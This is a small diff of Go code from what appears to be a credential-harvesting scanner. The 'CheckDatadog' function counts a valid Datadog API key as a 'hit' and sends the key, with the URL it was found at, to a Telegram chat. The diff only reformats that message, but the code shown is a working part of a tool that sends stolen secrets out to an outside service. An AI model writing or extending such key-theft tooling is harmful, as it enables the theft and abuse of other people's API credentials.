@@ -54,7 +54,7 @@ func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
 	globalCounters.mu.Unlock()
 
 	msg := a.tgHit("🐶", "DATADOG", sourceURL) + fmt.Sprintf(
-		"\n🔑 <b>Key:</b> <code>%s</code>\n", key)
+		"Key : %s\n", key)
 	go a.sendTelegram(msg)
 	return true
 }
